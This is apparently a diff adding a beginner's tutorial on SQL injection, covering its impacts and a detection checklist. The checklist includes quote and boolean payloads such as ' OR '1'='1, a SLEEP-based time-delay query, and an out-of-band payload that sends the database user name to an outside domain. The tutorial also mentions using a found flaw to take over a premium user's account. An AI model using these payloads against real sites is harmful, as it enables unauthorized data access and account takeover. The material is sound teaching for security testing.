@@ -1,1 +1,49 @@
-Starts Here:
+SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
+This allows attackers to access data they are not supposed to access. Stored data may be usernames and passwords, personal information like medical conditions etc. In many cases the attacker can delete the data or modify it causing persistent changes to the applications content.
+Imagine there was a bank and this bank had a database and all the users had their passwords and usernames, and one day an attacker comes into contact with the database contacts. He might change their usernames and passwords and deny them access to their accounts and yes the users may try to retrieve their accounts but what if the attacker changed everything to their names and emails etc. That means the owners account doesn't exist anymore. Its a complete account takeover. Alternatively the attacker can just steal all the cash and run away which would still be bad and unethical. So this is an important topic and 
+
+SQLi are so powerful they can be used to cause Denial of Service (Dos), attacking the underlying servers and even the backend systems.
+
+A successful sql attack can result in unauthorized access to: 
+a) Passwords to your accounts.
+b) Credit Cards and their years of expiration and all other details about them hence the attacker can purchase things with your name or just steal your money
+c) Personal User Information like date of birth, diseases etc.
+d) Transaction data of banks, purchases etc
+e) Application data of employees, lecturers etc
+f) Metadata of documents.
+
+These SQLi attacks can lead to creation of backdoors into systems by attackers hence stay along time unnoticed.
+
+Check the fines for data breaches under the GDPR in Europe and America. The fines are millions of dollars just because of a data breach that can be caused by, but not limited to SQLi.
+
+Now lets go to the SQLi checklist:
+
+1. Inserting a ( ' ) quote in any field you can maybe the username and password fields and search fields maybe its a movies site and just look at what the errors give you or just look for any other anomalies in terms of how the page responds.
+
+2. Insert the base or original information ie if its a username and password field just insert the a random username and password, check its response and then go back and add an sql-specific syntax like ' OR '1'='1 and look at the responses and mark the differences.
+
+3. Insert the OR 1 = 1 then the  OR 1 = 2  then note the differences. These are called the boolean conditions that bring either a true or a false.
+
+4. Insert payloads that are designed to trigger time delays when executed within a sql query and look for the differences in the time taken. This is called time-based blind SQLi. This means that you insert a specific sql command to slow down the server. 
+Example:
+SELECT * FROM users WHERE id=1 AND IF(1=1, SLEEP(5), 0); -- This causes a 5-second delay if 1=1 (true)
+
+Okay say you are testing a movies site. You type the movie in the search and the server is quite first so it loads the movie quickly. Now if this is the case there is no username and password field here but we can inject into this search field and if it works then the site is vulnerable to SQLi and you can now continue with your attacks knowing that they will work. SQLi are not only used to retrieve passwords and usernames they can do much more than that as read above. So this site may not necessarily have a username and password field or for you to watch you dont need them but if you want premium access you need it and so you create your account and since its now vulnerable to sql as we have discovered through the movie search it means the attacker can retrieve the account of the premium user.
+
+5. The other way we can detect the presence of SQLi vulnerabilities is by inserting the OAST payloads. This is (OUT-of-Band Application Security Testing). Thats a long name but basically what it does is its designed to make an application interact with an external server when a SQl query is executed. This interaction can be monitored to detect vulnerabilities. 
+For example, if you inject this OAST payload to make a network request to an external server, you can monitor its request to see if it was really triggered by your payload and if it was then it means that there might be SQLi vulnerabilities that might not be obvious. Think of it like, you have your machine its open to calls and you use your the application to call your machine. If your machine accepts the call or receives it then the application may be vulnerable to SQLi.
+
+Example:
+An examples of the OAST is, 
+' OR 1=1; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.yourdomain.com')); --
+The part it says "yourdomain.com" you should type in your external server or any domain you will be able to monitor and if the call is reached then we might find SQLi vulnerabilities in there. 
+
+The nice thing about OAST is that even when the application doesn't show you redirect messages, the query is still being run in the background and will be executed the evidence is the calls you receive on the external server you set up or your domain.
+
+Alternatively you can just use your burp scanner if you do not want to get into all that manual work but I recommend you get to know what the tool is doing in the background.
+
+Most SQli vulnerabilities occur in the WHERE clause of a SELECT query, but that doesn't mean you cannot find them anywhere else.
+
+
+
+
